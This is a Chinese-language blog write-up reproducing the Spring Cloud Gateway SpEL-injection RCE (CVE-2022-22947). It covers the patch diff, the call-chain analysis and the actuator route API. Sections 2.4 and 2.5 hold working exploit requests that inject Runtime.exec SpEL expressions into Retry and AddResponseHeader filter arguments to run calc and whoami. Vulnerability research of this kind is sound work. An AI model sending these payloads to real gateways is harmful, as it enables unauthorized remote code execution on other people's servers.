说明：此篇记录SpringCloud Gateway相关的SPEL表达式导致的RCE复现过程，相关的内容来自互联网，本篇仅做记录。

# 1 SpringCloud Gateway的漏洞介绍
Spring Cloud Gateway 是Spring Cloud的一个全新的API网关项目，目的是为了替换掉Zuul1，它基于Spring5.0 + SpringBoot2.0 + WebFlux（基于性能的Reactor模式响应式通信框架Netty，异步阻塞模型）等技术开发，性能于Zuul，官测试，Spring Cloud GateWay是Zuul的1.6倍 ，旨在为微服务架构提供种简单有效的统的API路由管理式。可以与Spring Cloud Discovery Client（如Eureka）、Ribbon、Hystrix等组件配合使用，实现路由转发、负载均衡、熔断、鉴权、路径重写、志监控等。Gateway还内置了限流过滤器，实现了限流的功能。设计优雅，容易拓展
**SpringCloud的核心流程**
![image.png](https://gitee.com/shine05/myblog-gallery/raw/master/img/3e1e34abd868c51c42e9fc57e384b032.png)

# 2 漏洞相关的介绍  
根据github相关的源码介绍：https://github.com/spring-cloud/spring-cloud-gateway/commit/337cef276bfd8c59fb421bfe7377a9e19c68fe1e
源码的修改记录如下：
	![image.png](https://gitee.com/shine05/myblog-gallery/raw/master/img/0bf86e87715c8899f4fc39cf7fa63e2b.png)
  通过源码可以看到，代码将SPEL的StandardEvaluationContext 修改为了SimpleEvaluationContext，因此可以猜出之前的问题主要是由于SPEL表达式导致的。

## 2.1 SPEL表达式介绍
  [SPEL表达式介绍]( SPEL表达式的相关介绍)，可以参考之前的文章：https://moonsec.top/articles/64

## 2.2 漏洞的复现
**环境搭建**
影响范围：
Spring Cloud Gateway 3.1.x < 3.1.1
Spring Cloud Gateway < 3.0.7
p牛的vulhub已经搭好docker了，https://github.com/vulhub/vulhub/tree/master/spring/CVE-2022-22947
**也可以本地搭建**
git clone https://github.com/spring-cloud/spring-cloud-gateway
cd spring-cloud-gateway
git checkout v3.1.0
然后idea打开项目，再调试或启动

## 2.3 调用过程分析

1、非常标准的spel表达式使用，代码在org/springframework/cloud/gateway/support/ShortcutConfigurable#getValue()方法中，搜索其调用位置
![image.png](https://gitee.com/shine05/myblog-gallery/raw/master/img/fafe7bd0e503ad4d1fac93aa27163d64.png)
2、既然此处会被执行SpEL表达式，那就可以查看都有哪些地方对此进行调用，可以选中getValue方法并且ctrl+alt+h即可查看被调用情况，可以看到有三个枚举常数对getValue方法进行调用并且都在ShortcutConfigurable接口中，而且三处都对normalize方法进行重写
![image.png](https://gitee.com/shine05/myblog-gallery/raw/master/img/f6002e519b425150f6a9fb66a5c8adbd.png)
3、继续向上追踪，查看哪些地方对normalize方法进行了调用，这次进入到了ConfigurationService类的内部类ConfigurableBuilder中的normalizeProperties方法，而normalizeProperties方法调用了normalize方法
![image.png](http://moonsec.top/articlepic/ed60442b4627bc07a9e28cbf42252eb3.png)
4、ConfigurationService类的内部类AbstractBuilder中的bind方法调用了normalizeProperties方法
![image.png](http://moonsec.top/articlepic/ed479c200df2f22fc7c6a26509385249.png)
5、而bind方法被五处地方所引用：
- AbstractRateLimiter类中的onApplicationEvent方法
- RouteDefinitionRouteLocator类中的loadGatewayFilters方法与lookup方法
- WeightCalculatorWebFilter类中的handle方法
- BetweenRoutePredicateFactoryTests类中的bindConfig方法
主要关注loadGatewayFilters方法
![image.png](https://gitee.com/shine05/myblog-gallery/raw/master/img/53df4d436b772421d2428e3bf2292a55.png)
6、loadGatewayFilters 方法
查看loadGatewayFilters 的调用方式
loadGatewayFilters方法继续向前路径为：loadGatewayFilters() -> getFilters() -> convertToRoute() -> getRoutes()
![image.png](https://gitee.com/shine05/myblog-gallery/raw/master/img/ef22bfc409e6620920902b7fa632c3c8.png)

整个的调用链为

```java
getValue:273, Spelexpression (org.springframework.expression.spel.standard)

getValue:60, ShortcutConfigurable (org.springframework.cloud.gateway.support)

normalize:94, ShortcutConfigurable$ShortcutType$1 (org.springframework.cloud.gateway.support)

normalizeProperties:140, ConfigurationService$ConfigurableBuilder (org.springframework.cloud.gateway.support)

bind:241, ConfigurationService$AbstractBuilder (org.springframework.cloud.gateway.support)

loadGatewayFilters:144, RouteDefinitionRouteLocator (org.springframework.cloud.gateway.route)

getFilters:176, RouteDefinitionRouteLocator (org.springframework.cloud.gateway.route)

convertToRoute:117, RouteDefinitionRouteLocator (org.springframework.cloud.gateway.route)

...
```

通过IDEA的调用链也可以很容易的发现下图所示的调用关系：
![image.png](https://gitee.com/shine05/myblog-gallery/raw/master/img/7bb1bd48eaa8b4221b5461d6f0fc3dd6.png)
即：
在@GetMapping("/routes/{id}")  和 @GetMapping("/routes") 两个controller 方法中都可以最终调用到SPEL中的getValue方法。
通过下表的Gateway接口，可以看到Gateway支持很多接口：
![image.png](https://gitee.com/shine05/myblog-gallery/raw/master/img/cded24e6edb5daec36aaacc8c06257f3.png)

## 2.4 RCE调用链接口分析


1、根据上述步骤6的接口分析，查看Gateway的接口官方spec 说明：
![image.png](http://moonsec.top/articlepic/cbe30eaeea210e75b45f2adba005196b.png)
2、Gateway的接口请求返回的接口如下所示：
/actuator/gateway/routes 返回的结果：
```txt
[{
  "route_id": "first_route",
  "route_object": {
    "predicate": "org.springframework.cloud.gateway.handler.predicate.PathRoutePredicateFactory$$Lambda$432/1736826640@1e9d7e7d",
    "filters": [
      "OrderedGatewayFilter{delegate=org.springframework.cloud.gateway.filter.factory.PreserveHostHeaderGatewayFilterFactory$$Lambda$436/674480275@6631ef72, order=0}"
    ]
  },
  "order": 0
},
{
  "route_id": "second_route",
  "route_object": {
    "predicate": "org.springframework.cloud.gateway.handler.predicate.PathRoutePredicateFactory$$Lambda$432/1736826640@cd8d298",
    "filters": []
  },
  "order": 0
}]
```

/actuator/gateway/routes/{id} 返回结果
```txt
{
  "id": "first_route",
  "predicates": [{
    "name": "Path",
    "args": {"_genkey_0":"/first"}
  }],
  "filters": [],
  "uri": "https://www.uri-destination.org",
  "order": 0
}]

```
可以发现两个接口返回的内容格式是一致的，只是返回的内容不一致。/actuator/gateway/routes/{id} 会返回对应的id的内容。

3、通过Get请求的接口可知道如果需要rce，肯定要提交一个自己的route，然后进行访问。查看对应的spec文档
![image.png](http://moonsec.top/articlepic/6e7e89e2a6f9d5a1c3b2baafe843f395.png)
按照官方的说法，创建router的请求参数和get的是一样的。
但是get请求的 **"filters": []**,参数为空，并没有说明参数的类型。

4、查看post的接口
![image.png](http://moonsec.top/articlepic/829d183caf347b8d88f927845fbe5467.png)
![image.png](https://gitee.com/shine05/myblog-gallery/raw/master/img/8549815bdb5b269b5eed5fb29a5120a1.png)
参考上述的post的参数，查看下该post接口，该接口通过validateRouteDefinition进行传入的参数校验。
![image.png](http://moonsec.top/articlepic/933311d9e66abf84ea4649c5a57aec30.png)
跟进isAvailable 查看进行校验的规则
![image.png](https://gitee.com/shine05/myblog-gallery/raw/master/img/289a07e4a8914909f0408a15bb082148.png)
对应的校验逻辑是：RouteDefinition-->getFileter-->getName --> 判断和GatewayFilters.getName 是否相等。
其中RouteDefinition为我们刚才传入的参数，如下所示：

```txt
{
  "id": "first_route",
  "predicates": [{
    "name": "Path",
    "args": {"_genkey_0":"/first"}
  }],
  "filters": [],
  "uri": "https://www.uri-destination.org",
  "order": 0
}]
```
调试下GatewayFilters 为哪些，在post时候只要加入即可通过校验,在校验的isAvailable方法中下个断点
![image.png](https://gitee.com/shine05/myblog-gallery/raw/master/img/a73be3905ce28bf9da8ae61c7243e482.png)
打印出全部的相关GatewayFileters 名称：
```txt
for(int i = 0;i<((ArrayList)this.GatewayFilters).size();i++){
    System.out.println(this.GatewayFilters.get(i).name());
}

打印出的参数
[AddRequestHeaderGatewayFilterFactory@234c5e41 configClass = AbstractNameValueGatewayFilterFactory.NameValueConfig]
AddRequestHeader
[MapRequestHeaderGatewayFilterFactory@40ef0af8 configClass = MapRequestHeaderGatewayFilterFactory.Config]
MapRequestHeader
[AddRequestParameterGatewayFilterFactory@36790bec configClass = AbstractNameValueGatewayFilterFactory.NameValueConfig]
AddRequestParameter
[AddResponseHeaderGatewayFilterFactory@461c3709 configClass = AbstractNameValueGatewayFilterFactory.NameValueConfig]
AddResponseHeader
[ModifyRequestBodyGatewayFilterFactory@7e3d7dd configClass = ModifyRequestBodyGatewayFilterFactory.Config]
ModifyRequestBody
[DedupeResponseHeaderGatewayFilterFactory@3f63a513 configClass = DedupeResponseHeaderGatewayFilterFactory.Config]
DedupeResponseHeader
[ModifyResponseBodyGatewayFilterFactory@413bef78 configClass = ModifyResponseBodyGatewayFilterFactory.Config]
ModifyResponseBody
[CacheRequestBodyGatewayFilterFactory@66383c29 configClass = CacheRequestBodyGatewayFilterFactory.Config]
CacheRequestBody
[PrefixPathGatewayFilterFactory@7f7c420c configClass = PrefixPathGatewayFilterFactory.Config]
PrefixPath
[PreserveHostHeaderGatewayFilterFactory@5d152bcd configClass = Object]
PreserveHostHeader
[RedirectToGatewayFilterFactory@43cb5f38 configClass = RedirectToGatewayFilterFactory.Config]
RedirectTo
[RemoveRequestHeaderGatewayFilterFactory@6435fa1c configClass = AbstractGatewayFilterFactory.NameConfig]
RemoveRequestHeader
[RemoveRequestParameterGatewayFilterFactory@7944b8b4 configClass = AbstractGatewayFilterFactory.NameConfig]
RemoveRequestParameter
[RemoveResponseHeaderGatewayFilterFactory@d7bbf12 configClass = AbstractGatewayFilterFactory.NameConfig]
RemoveResponseHeader
[RewritePathGatewayFilterFactory@1450131a configClass = RewritePathGatewayFilterFactory.Config]
RewritePath
[RetryGatewayFilterFactory@5f7eee96 configClass = RetryGatewayFilterFactory.RetryConfig]
Retry
[SetPathGatewayFilterFactory@3a36cd5 configClass = SetPathGatewayFilterFactory.Config]
SetPath
[SecureHeadersGatewayFilterFactory@53f0d09c configClass = SecureHeadersGatewayFilterFactory.Config]
SecureHeaders
[SetRequestHeaderGatewayFilterFactory@47acd13b configClass = AbstractNameValueGatewayFilterFactory.NameValueConfig]
SetRequestHeader
[SetRequestHostHeaderGatewayFilterFactory@6f8e9d06 configClass = SetRequestHostHeaderGatewayFilterFactory.Config]
SetRequestHostHeader
[SetResponseHeaderGatewayFilterFactory@77d381e6 configClass = AbstractNameValueGatewayFilterFactory.NameValueConfig]
SetResponseHeader
[RewriteResponseHeaderGatewayFilterFactory@2272cbb0 configClass = RewriteResponseHeaderGatewayFilterFactory.Config]
RewriteResponseHeader
[RewriteLocationResponseHeaderGatewayFilterFactory@3f6f3cc configClass = RewriteLocationResponseHeaderGatewayFilterFactory.Config]
RewriteLocationResponseHeader
[SetStatusGatewayFilterFactory@180b3819 configClass = SetStatusGatewayFilterFactory.Config]
SetStatus
[SaveSessionGatewayFilterFactory@733c464f configClass = Object]
SaveSession
[StripPrefixGatewayFilterFactory@47272cd3 configClass = StripPrefixGatewayFilterFactory.Config]
StripPrefix
[RequestHeaderToRequestUriGatewayFilterFactory@73fbdf68 configClass = AbstractGatewayFilterFactory.NameConfig]
RequestHeaderToRequestUri
[RequestSizeGatewayFilterFactory@32f1fafe configClass = RequestSizeGatewayFilterFactory.RequestSizeConfig]
RequestSize
[RequestHeaderSizeGatewayFilterFactory@236eccd1 configClass = RequestHeaderSizeGatewayFilterFactory.Config]
RequestHeaderSize

```
这里的每种name，实际上又对应了不同的GatewayFilterFactory，我们选择一个Retry来做个验证。

5、Retry 的RCE 
构造基于Retry 的RCE
```txt
POST /actuator/gateway/routes/testw 	HTTP/1.1
Host: 192.168.43.8:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.49
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close
Content-Type: application/json
Content-Length: 475

{
  "id": "testw",
  "predicates": [{
    "name": "Path",
    "args": {"_genkey_0":"/first"}
  }],
  "filters": [
		{
		"name":"Retry",
		"args": {
         "value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"cmd \", \"/C\", \" calc\"}).getInputStream()))}",
          "name": "cmd123"
            }
		}
	],
  "uri": "https://www.uri-destination.org",
  "order": 0
}]
```
![image.png](https://gitee.com/shine05/myblog-gallery/raw/master/img/d4b37855c20cadf4a4824fde42e691ec.png)
刷新路由，即可触发RCE，弹出计算器
![image.png](http://moonsec.top/articlepic/5b080197469a1ef6878b1aff5d789302.png)
PS：此处刷新路由，是因为Gateway如果让路由生效，必须进行刷新才行。刷新后路由自动加载。
请求该路由信息
![image.png](http://moonsec.top/articlepic/1f730e2547fff96e43bc57e32c35776a.png)

++**==6、我们回过头了看看为啥会触发该RCE==**++
在==2.3 中咱们分析了调用过程==，下面咱们来看看为何可以触发该RCE
根据Debug调试的逻辑：
从该refresh逻辑跟进
![image.png](http://moonsec.top/articlepic/40facb58062d1790d6e0a5a245ac248d.png)
通过该逻辑向上回溯，发现调用了refresh方法
![image.png](https://gitee.com/shine05/myblog-gallery/raw/master/img/553a981cf965fd6b6945b0cc39529e38.png)
继续跟进，发现调用了org.springframework.cloud.gateway.route.RouteDefinitionRouteLocator#convertToRoute
![image.png](https://gitee.com/shine05/myblog-gallery/raw/master/img/4350acaf35ab9c35eac31ecdab51ff00.png)
在convertToRoute中getFilters获取各个router的routeDefinition
![image.png](http://moonsec.top/articlepic/f0b8d7d7edd094bc553cf465f60709b9.png)
routeDefinition即为我们post中传入的参数，如我们传入的如下参数
![image.png](https://gitee.com/shine05/myblog-gallery/raw/master/img/af30f796fb31471444254af919ae2ef9.png)
在getFilters 中添加全部的过滤器，比如我们的传入的
![image.png](https://gitee.com/shine05/myblog-gallery/raw/master/img/fd9e7214c63bae41cbfe802fec3ce01a.png)
org.springframework.cloud.gateway.route.RouteDefinitionRouteLocator#loadGatewayFilters 中加载我们的过滤器以及参数
![image.png](http://moonsec.top/articlepic/79587cfd1f66a8b5be5ace54bfe8b179.png)
在definition.getArgs() 加载所有的args
![image.png](https://gitee.com/shine05/myblog-gallery/raw/master/img/f0fc703a84e3177180e6fcabba3f8549.png)

然后通过normalizeProperties---> normalize 中getvalue
![image.png](http://moonsec.top/articlepic/f32b6854bce0a065b4cc12eb2234a865.png)
在getValue中执行对应的SPEL表达式，进而触发RCE。

相关的调用链如下：
```txt
getValue:57, ShortcutConfigurable (org.springframework.cloud.gateway.support)
normalize:94, ShortcutConfigurable$ShortcutType$1 (org.springframework.cloud.gateway.support)
normalizeProperties:140, ConfigurationService$ConfigurableBuilder (org.springframework.cloud.gateway.support)
bind:241, ConfigurationService$AbstractBuilder (org.springframework.cloud.gateway.support)
loadGatewayFilters:144, RouteDefinitionRouteLocator (org.springframework.cloud.gateway.route)
getFilters:176, RouteDefinitionRouteLocator (org.springframework.cloud.gateway.route)
convertToRoute:117, RouteDefinitionRouteLocator (org.springframework.cloud.gateway.route)
apply:-1, 1641677843 (org.springframework.cloud.gateway.route.RouteDefinitionRouteLocator$$Lambda$849)
onNext:106, FluxMap$MapSubscriber (reactor.core.publisher)
tryEmitScalar:488, FluxFlatMap$FlatMapMain (reactor.core.publisher)
onNext:421, FluxFlatMap$FlatMapMain (reactor.core.publisher)
drain:432, FluxMergeSequential$MergeSequentialMain (reactor.core.publisher)
innerComplete:328, FluxMergeSequential$MergeSequentialMain (reactor.core.publisher)
onSubscribe:552, FluxMergeSequential$MergeSequentialInner (reactor.core.publisher)
subscribe:165, FluxIterable (reactor.core.publisher)
subscribe:87, FluxIterable (reactor.core.publisher)
subscribe:8469, Flux (reactor.core.publisher)
onNext:237, FluxMergeSequential$MergeSequentialMain (reactor.core.publisher)
slowPath:272, FluxIterable$IterableSubscription (reactor.core.publisher)
request:230, FluxIterable$IterableSubscription (reactor.core.publisher)
onSubscribe:198, FluxMergeSequential$MergeSequentialMain (reactor.core.publisher)
subscribe:165, FluxIterable (reactor.core.publisher)
subscribe:87, FluxIterable (reactor.core.publisher)
subscribe:8469, Flux (reactor.core.publisher)
onNext:237, FluxMergeSequential$MergeSequentialMain (reactor.core.publisher)
slowPath:272, FluxIterable$IterableSubscription (reactor.core.publisher)
request:230, FluxIterable$IterableSubscription (reactor.core.publisher)
onSubscribe:198, FluxMergeSequential$MergeSequentialMain (reactor.core.publisher)
subscribe:165, FluxIterable (reactor.core.publisher)
subscribe:87, FluxIterable (reactor.core.publisher)
subscribe:4400, Mono (reactor.core.publisher)
subscribeWith:4515, Mono (reactor.core.publisher)
subscribe:4371, Mono (reactor.core.publisher)
subscribe:4307, Mono (reactor.core.publisher)
subscribe:4279, Mono (reactor.core.publisher)
onApplicationEvent:81, CachingRouteLocator (org.springframework.cloud.gateway.route)
onApplicationEvent:40, CachingRouteLocator (org.springframework.cloud.gateway.route)
doInvokeListener:176, SimpleApplicationEventMulticaster (org.springframework.context.event)
invokeListener:169, SimpleApplicationEventMulticaster (org.springframework.context.event)
multicastEvent:143, SimpleApplicationEventMulticaster (org.springframework.context.event)
publishEvent:421, AbstractApplicationContext (org.springframework.context.support)
publishEvent:378, AbstractApplicationContext (org.springframework.context.support)
refresh:96, AbstractGatewayControllerEndpoint (org.springframework.cloud.gateway.actuate)

```
至此 Retry 走马观花的分析完成。

## 2.5 其他的调用链分析
Retry 属于 不可回显的RCE调用链，如果想要回显，可以使用AddResponseHeader，相关的调用如下:
AddRequestParameter
[ModifyRequestBodyGatewayFilterFactory@7e3d7dd configClass = ModifyRequestBodyGatewayFilterFactory.Config]
因为在org.springframework.cloud.gateway.filter.factory.rewrite.ModifyRequestBodyGatewayFilterFactory#apply 时候会向返回消息中出入运行的数据信息
![image.png](http://moonsec.top/articlepic/0c3c577b6584611c1d48ff5986dbc4e4.png)
对应的请求信息如下：
```txt
{
    "id": "test1",
    "filters": [
        {
            "name": "AddResponseHeader",
            "args": {
                "value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"whoami\"}).getInputStream()))}",
                "name": "cmd123"
            }
        }
    ],
    "uri": "http://aaa.com",
    "order": 0
}
```
响应信息如下：
![image.png](http://moonsec.top/articlepic/cc5378dfc3ffde35d4394e6e9eb7d35b.png)

# 后续接下篇
由于服务器的压力不行，后续的分析接下篇






# 参考
1、https://moonsec.top/articles/64
2、https://nosec.org/home/detail/5008.html
3、https://paper.seebug.org/1878/